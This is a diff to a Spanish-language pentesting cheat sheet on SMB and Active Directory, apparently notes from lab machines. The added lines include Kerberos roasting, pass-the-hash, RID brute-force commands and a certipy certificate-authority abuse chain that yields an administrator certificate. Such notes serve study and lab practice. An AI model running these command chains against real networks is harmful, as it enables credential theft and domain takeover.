@@ -2,7 +2,6 @@
 title: 'SMB (Server Message Block)'
 description: ''
 pubDate: 'Jul 03 2022'
-heroImage: '/ldapi.jpg'
 tag: ['windows', 'smb']
 slug: vuln/smb
 ---
@@ -103,16 +102,15 @@ Windows 7 y smb puede ser un Eternalblue.
 2: python2.7 zzz_exploit.py target
 
 ```bash
-$nmbloopup -A taget
+$nmblookup -A taget
 
 $rpcclient -U "" -N target
 
 # If we see IPC$ maybe null session works
 $smbclient -L target -N
 
-...-h
-...enumerate
-
+# rid -> 0x200
+rpcclient -U "leo&micontraseña" 10.10.11.233 -c "querygroup 0x200"
 ######################################
 # Despues de montar podemos ver en ls -lsa /media/k_share
 sudo mount.cifs //target/c /media/k_share user=,pass=
@@ -132,16 +130,22 @@ $smbclient //target/jane -U jane
 #other way to find users:
 $enum4linux -r -u "admin" -p "password1" target
 
+# users get by enum4linux
+
+GetNPUsers.py user.local/ -dc-ip 10.10.10.161 -request
 ```
 
 ### Kerberos
 
 ```bash
+# Ningunoi de estos kerberos sirce para cepas de hash
 # AS-REP Roasting attack, el usuario que muestre tiene configurado UF_DONT_REQUIRE_PREAUTH
 GetNPUsers.py domaindomain_name.local/ -no-pass -usersfile culos_validos.txt
 
 # intentamos crackear el hash con jhon, si conseguimos el pass toca
-# kerberoasting attack
+# kerberoasting attack, SI TENEMOS CREDENCIALES VALIDAS
+## request para coger el hash
+GetUserSPN.py target.htb/leonardo # muestra si es kerberoasteable
 GetUserSPN.py 'domain_name.local/username:password' -request
 
 # no aplica psexec.py si cmp no pwnea el usuario, si no muetra nada smbmap
@@ -151,10 +155,39 @@ GetUserSPN.py 'domain_name.local/username:password' -request
 neo4j console
 # bloodhound para enumerar, detectar vias para escalar privs
 bloodhound-python.py -c all -u 'culo' -p 'culo' -ns 10.10.10.10 -d domainname.local
-
+bloodhound.py # De github
 # pass de hash
 cmp winrm doman -u 'culo' -H 'HASH'
 # este usuario pertenece al grupo remote management users
 evil-winrm -i domain -u 'culo'
+
+```
+
+### Rid brute force
+
+```bash
+crackmapexec smb target_ip -u anonymous -p '' --rid-brute 10000
+```
+
+### Active Directory (AD)
+
+```bash
+certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'culo_torcido' -dc-ip target_ip
+
+certipy ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'culo_torcido' -dc-ip target_ip -enable-template 'SubCA'
+
+certipy req -username raven@manager.htb -password 'culo_torcido' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb
+
+certipy ca -ca 'manager-DC01-CA' -issue-request 20 -username raven@manager.htb -password 'culo_torcido'
+
+certipy req -username raven@manager.htb -password 'culo_torcido' -ca 'manager-DC01-CA' -target target_ip -retrieve 20
+
+
+certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip target_ip
+
+# sntp -sS manager.htb
+# ntpdate target_ip
+# rdate -n target_ip
+# nos metemos con psexec y el hash repotado
 
 ```
